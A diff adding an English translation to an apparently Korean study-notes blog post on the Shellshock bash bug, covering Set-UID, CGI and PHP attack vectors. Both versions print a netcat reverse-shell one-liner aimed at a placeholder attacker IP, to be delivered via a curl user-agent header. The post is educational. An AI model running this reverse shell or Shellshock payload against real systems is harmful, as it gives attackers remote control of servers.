@@ -7,9 +7,97 @@ categories:
 author: hyoeun
 math: true
 mathjax_autoNumber: true
+bilingual: true
 image: "/assets/thumbnails/2021-04-12-shellshock_attack.png"
 date: 2021-04-12 14:38:24
 ---
+
+## What is a Shell?
+
+A **shell** is a command-line interpreter that sits between the user and the operating system, reading commands and executing them. Common shells include sh, bash, csh, zsh, and Windows PowerShell. Among these, **bash** is by far the most prevalent on Linux-based systems. Security vulnerabilities found within bash itself are collectively referred to as **Shellshock**.
+
+To understand Shellshock, you first need to understand how bash handles function definitions exported via environment variables:
+
+```shell
+$ foo=' () { echo "hello world"; }'
+$ echo $foo
+() { echo "hello world"; }
+$ declare -f foo
+$ export foo
+$ bash
+(child):$ echo $foo
+
+(child):$ declare -f foo
+foo ()
+{
+    echo "hello world"
+}
+(child) :$ foo
+hello world
+```
+
+The critical behavior here: a string assigned as a shell variable in the parent shell is transmitted to a child bash process as a **shell function**, not a variable. Specifically:
+* The `export` command sends shell variables to child processes.
+* If the exported variable's value starts with `() {`, the child bash re-interprets it as a function definition.
+* The `declare -f` command prints shell functions.
+* Spaces inside `() {` are mandatory for bash to recognize it as a function.
+
+## The Shellshock Bug
+
+Shellshock stems from a parsing flaw in bash. When bash initializes, it scans environment variables for values starting with `() {` and converts them to functions:
+
+```
+foo='() { echo "test"; }' -> foo () { echo "test"; }
+```
+
+The bug: bash does not stop parsing after the closing `}` of the function definition. **If there are additional commands appended after the function body, bash executes them immediately during initialization.** This means any program that invokes a child bash process and passes user-controlled data as environment variables is vulnerable.
+
+## Shellshock Attack on Set-UID Programs
+
+If a privileged Set-UID program invokes bash internally (directly or via `system()`), an attacker can craft an environment variable that, when bash initializes, executes arbitrary commands with the elevated EUID. Shells like `dash` that check for RUID/EUID mismatch and drop privileges do not prevent this vulnerability in programs that do not implement such checks themselves.
+
+## Shellshock Attack on CGI Programs
+
+**CGI (Common Gateway Interface)** allows web servers to run external programs dynamically to generate web responses. If a CGI script runs under bash (e.g., starts with `#!/bin/bash`), it is directly exploitable.
+
+The attack flow:
+1. Apache receives an HTTP request and forks a child process.
+2. `exec()` runs `/bin/bash` to execute the CGI script.
+3. HTTP headers (including `User-Agent`, `Referer`, etc.) are passed as environment variables to the child bash process.
+4. If bash parses those variables during initialization and finds a Shellshock payload, it executes it.
+
+Since modifying headers in a browser is cumbersome, `curl -A` is the standard tool for sending Shellshock payloads. In test environments, files like `/var/www/SQL/collabtive/config/standard/config.php` often contain hardcoded database credentials that become accessible after exploitation.
+
+## Reverse Shell
+
+A **reverse shell** gives an attacker interactive control over a remote machine's input and output. The standard netcat-based approach:
+
+1. Attacker listens: `nc -l 9090 -v`
+2. On the victim server, execute: `/bin/bash -i > /dev/tcp/<attacker_ip>/9090 0<&1 2>&1`
+
+Breaking down the redirection:
+* `-i` makes bash interactive.
+* `> /dev/tcp/<ip>/9090` redirects stdout to a TCP connection on port 9090.
+* `0<&1` redirects stdin to the same connection (fd 1 = stdout is now the network socket).
+* `2>&1` redirects stderr to stdout (same network socket).
+
+The result: all stdin/stdout/stderr are bridged over the network connection, giving the attacker a fully interactive remote shell. This payload is delivered via the Shellshock vector in the `curl -A` user-agent header.
+
+## Remote Attack on PHP
+
+For a Shellshock attack against a PHP application, two conditions must both hold:
+
+1. **Bash invocation:** The PHP code calls `system()` or similar, and the system shell is bash.
+2. **User-controlled environment variable:** The PHP code sets an environment variable from user input (e.g., from `$_GET`, `$_POST`, or HTTP headers) before the `system()` call.
+
+If both conditions are met, the user-controlled value in the environment variable will be parsed by the newly-invoked bash, triggering execution of the appended Shellshock payload.
+
+## Reference
+
+* [COMPUTER SECURITY: A Hands-on Approach by Wenliang Du](https://www.amazon.com/Computer-Security-Hands-Approach-Wenliang/dp/154836794X)
+
+---
+
 ## Shell이란?
 * Shell이란 command-line interpreter이다. 유저와 OS사이에서 명령어들을 읽고 그것들을 실행시켜준다.
 * sh, bash, csh, zsh, Windows PowerShell 등이 있다.
@@ -70,7 +158,7 @@ foo='() { echo "test"; } -> foo () { echo "test"; }
 * 이후 서버쪽에서 ```$ /bin/bash -i > /dev/tcp/<attacker ip>/9090 0<&1 2>&1```을 실행시켜준다.
 * bash를 interactive하게 쓴다는 거고 거기의 stdout을 9090포트로 보내는데 stdout내용을 fd 0(stdin) 으로 사용하고 stderr는 stdout(fd 1)로 보내겠다는 의미이다.
 * 서버에 보내는 명령어를 이전에 배운 shellshock를 통해 실행시키면 되는데 curl -A에 넣어서 보내면 된다.
-* Reverse shell에서 중요한 것은 standard input, output, and error에 관한 값을 공격자의 network connection으로 redirect하는 것이다. 
+* Reverse shell에서 중요한 것은 standard input, output, and error에 관한 값을 공격자의 network connection으로 redirect하는 것이다.
 
 
 ## Remote Attack on PHP
